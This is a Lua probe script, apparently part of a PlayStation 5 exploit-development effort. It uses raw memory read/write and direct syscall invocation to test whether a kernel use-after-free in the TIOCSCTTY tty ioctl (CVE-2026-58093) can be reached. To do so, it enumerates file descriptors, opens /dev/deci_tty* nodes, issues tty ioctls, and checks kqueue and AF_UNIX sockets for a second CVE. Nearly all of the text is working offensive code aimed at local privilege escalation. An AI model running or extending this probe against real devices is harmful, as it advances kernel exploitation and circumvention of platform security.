-- CRASH_CLASS: LOW
-- PROBE 58d: CVE-2026-58093 reachability — TIOCSCTTY on PS5 14.10
--
-- CVE-2026-58093 (SA-26:62): TIOCSCTTY handler releases tty lock to take
-- proctree lock, doesn't recheck terminal state → race UAF → LPE.
--
-- We need: (1) a tty device fd, (2) TIOCSCTTY ioctl accepted, (3) threads.
-- We have threading (127h-127j). deci_tty2 is reportedly open (137e).
--
-- This probe: enumerate fds via fstat, try opening /dev/deci_tty* nodes,
-- test TIOCSCTTY ioctl (0x20007461) and related tty ioctls.

print("=== PROBE 58d: TIOCSCTTY REACHABILITY ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

-- Syscalls
local sc_fstat = mk(189)    -- fstat(fd, stat_buf)
local sc_ioctl = mk(54)     -- ioctl(fd, cmd, arg)
local sc_open = mk(5)       -- open(path, flags, mode)
local sc_close = mk(6)      -- close(fd)
local sc_isatty_ioctl = mk(54)

-- Ioctl constants
local TIOCSCTTY  = 0x20007461  -- _IO('t', 97) — set controlling terminal
local TIOCGETA   = 0x402C7413  -- _IOR('t', 19, termios) — get terminal attrs
local TIOCGPGRP  = 0x40047477  -- _IOR('t', 119, int) — get pgrp
local TIOCGSID   = 0x40047463  -- _IOR('t', 99, int) — get session id
local TIOCGWINSZ = 0x40087468  -- _IOR('t', 104, winsize) — get window size
local FIODTYPE   = 0x4004667A  -- _IOR('f', 122, int) — get device type

local buf = memory.alloc(0x200)

-- ============ SECTION 1: Enumerate inherited fds ============
print("[1] Enumerate fds 0-15 via fstat")

local stat_buf = memory.alloc(0x200)
for fd = 0, 15 do
    for off = 0, 0x1FC, 4 do wd(N(stat_buf) + off, 0) end
    local ret = nil
    pcall(function() ret = sc_fstat(uint64(fd), stat_buf) end)
    if ret and N(ret) == 0 then
        local mode = rd(N(stat_buf) + 4) or 0   -- st_mode at offset 4
        local dev = rd(N(stat_buf) + 0) or 0     -- st_dev at offset 0
        local rdev = rd(N(stat_buf) + 0x28) or 0 -- st_rdev
        local ftype = math.floor(mode / 0x1000) % 0x10
        local ftype_name = "?"
        if ftype == 2 then ftype_name = "CHR"
        elseif ftype == 4 then ftype_name = "DIR"
        elseif ftype == 6 then ftype_name = "BLK"
        elseif ftype == 8 then ftype_name = "REG"
        elseif ftype == 10 then ftype_name = "LNK"
        elseif ftype == 12 then ftype_name = "SOCK"
        elseif ftype == 1 then ftype_name = "FIFO"
        end

        -- Try FIODTYPE to get device type
        wd(N(buf), 0)
        local dt_ret = nil
        pcall(function() dt_ret = sc_ioctl(uint64(fd), uint64(FIODTYPE), buf) end)
        local dtype = rd(N(buf)) or -1

        -- Try TIOCGETA to check if it's a tty
        for off = 0, 0x2C, 4 do wd(N(buf) + off, 0) end
        local tty_ret = nil
        pcall(function() tty_ret = sc_ioctl(uint64(fd), uint64(TIOCGETA), buf) end)
        local is_tty = (tty_ret and N(tty_ret) == 0)

        print(string.format("  fd=%d type=%s mode=0x%X rdev=0x%X dtype=%d tty=%s",
            fd, ftype_name, mode, rdev, dtype, tostring(is_tty)))
    end
end

-- ============ SECTION 2: Try opening /dev/deci_tty* ============
print("")
print("[2] Open /dev/deci_tty* nodes")

local deci_ttys = {
    "/dev/deci_tty2", "/dev/deci_tty0", "/dev/deci_tty1",
    "/dev/deci_tty3", "/dev/deci_tty4", "/dev/deci_tty5",
    "/dev/deci_tty6", "/dev/deci_tty7",
    "/dev/tty", "/dev/ttyv0", "/dev/console", "/dev/ptmx"
}

local tty_fds = {}

for _, path in ipairs(deci_ttys) do
    -- Write path to buffer
    local path_buf = memory.alloc(64)
    for i = 1, #path do
        wd(N(path_buf) + i - 1, string.byte(path, i))
    end
    wd(N(path_buf) + #path, 0)

    -- open(path, O_RDWR=2, 0)
    local fd_ret = nil
    pcall(function() fd_ret = sc_open(path_buf, uint64(2), uint64(0)) end)
    local fd_val = fd_ret and N(fd_ret) or -1
    if fd_val < 0 then fd_val = -1 end
    if fd_val > 0x10000 then fd_val = -1 end

    if fd_val >= 0 then
        -- Test if it's a tty
        for off = 0, 0x2C, 4 do wd(N(buf) + off, 0) end
        local tty_ret = nil
        pcall(function() tty_ret = sc_ioctl(uint64(fd_val), uint64(TIOCGETA), buf) end)
        local is_tty = (tty_ret and N(tty_ret) == 0)

        print(string.format("  %s → fd=%d tty=%s", path, fd_val, tostring(is_tty)))
        if is_tty then
            table.insert(tty_fds, {fd = fd_val, path = path})
        end
    else
        print(string.format("  %s → DENIED", path))
    end
end

-- ============ SECTION 3: Test TIOCSCTTY on any tty fd ============
print("")
print("[3] Test TIOCSCTTY on tty fds")

-- Also check inherited fds that might be ttys
for fd = 0, 5 do
    for off = 0, 0x2C, 4 do wd(N(buf) + off, 0) end
    local tty_ret = nil
    pcall(function() tty_ret = sc_ioctl(uint64(fd), uint64(TIOCGETA), buf) end)
    if tty_ret and N(tty_ret) == 0 then
        table.insert(tty_fds, {fd = fd, path = "inherited:" .. fd})
    end
end

if #tty_fds == 0 then
    print("  NO TTY FDS FOUND — CVE-2026-58093 is UNREACHABLE")
else
    for _, t in ipairs(tty_fds) do
        -- TIOCSCTTY: ioctl(fd, 0x20007461, 0)
        local sctty_ret = nil
        local sctty_ok = pcall(function()
            sctty_ret = sc_ioctl(uint64(t.fd), uint64(TIOCSCTTY), uint64(0))
        end)

        -- TIOCGSID: get session id
        wd(N(buf), 0)
        local sid_ret = nil
        pcall(function() sid_ret = sc_ioctl(uint64(t.fd), uint64(TIOCGSID), buf) end)
        local sid = rd(N(buf)) or -1

        -- TIOCGPGRP: get pgrp
        wd(N(buf), 0)
        local pgrp_ret = nil
        pcall(function() pgrp_ret = sc_ioctl(uint64(t.fd), uint64(TIOCGPGRP), buf) end)
        local pgrp = rd(N(buf)) or -1

        -- TIOCGWINSZ
        for off = 0, 7, 4 do wd(N(buf) + off, 0) end
        local ws_ret = nil
        pcall(function() ws_ret = sc_ioctl(uint64(t.fd), uint64(TIOCGWINSZ), buf) end)
        local ws_row = rd(N(buf)) or 0
        local ws_col = rd(N(buf) + 2) or 0

        print(string.format("  %s (fd=%d): TIOCSCTTY ok=%s ret=%s sid=%d pgrp=%d ws=%dx%d",
            t.path, t.fd, tostring(sctty_ok), fmt(sctty_ret), sid, pgrp,
            ws_row % 0x10000, ws_col % 0x10000))

        if sctty_ret and N(sctty_ret) == 0 then
            print("  *** TIOCSCTTY ACCEPTED — CVE-2026-58093 IS REACHABLE! ***")
        elseif sctty_ret then
            local rv = N(sctty_ret)
            if rv > 0x7FFFFFFF then rv = rv - 0x100000000 end
            print(string.format("  TIOCSCTTY returned %d (errno?)", rv))
        end
    end
end

-- ============ SECTION 4: Test kqueue reachability ============
print("")
print("[4] kqueue(362) reachability")
local kq_ret = nil
pcall(function() kq_ret = mk(362)() end)
print(string.format("  kqueue() = %s", fmt(kq_ret)))
if kq_ret then
    local kqfd = N(kq_ret)
    if kqfd >= 0 and kqfd < 0x10000 then
        print(string.format("  kqueue fd=%d — kqueue WORKS", kqfd))
        pcall(function() sc_close(uint64(kqfd)) end)
    else
        print("  kqueue returned error")
    end
end

-- ============ SECTION 5: AF_UNIX socket reachability ============
print("")
print("[5] AF_UNIX socket for CVE-2026-58090")
local sc_socket = mk(97)
local unix_ret = nil
pcall(function() unix_ret = sc_socket(uint64(1), uint64(1), uint64(0)) end)
print(string.format("  socket(AF_UNIX, SOCK_STREAM) = %s", fmt(unix_ret)))
if unix_ret then
    local uxfd = N(unix_ret)
    if uxfd >= 0 and uxfd < 0x10000 then
        print(string.format("  unix socket fd=%d — AF_UNIX WORKS", uxfd))
        pcall(function() sc_close(uint64(uxfd)) end)
    end
end

print("")
print("canary=" .. (N(native.fcall_with_rax(stub, 20)) == pid and "OK" or "FAIL"))
print("=== 58d COMPLETE ===")
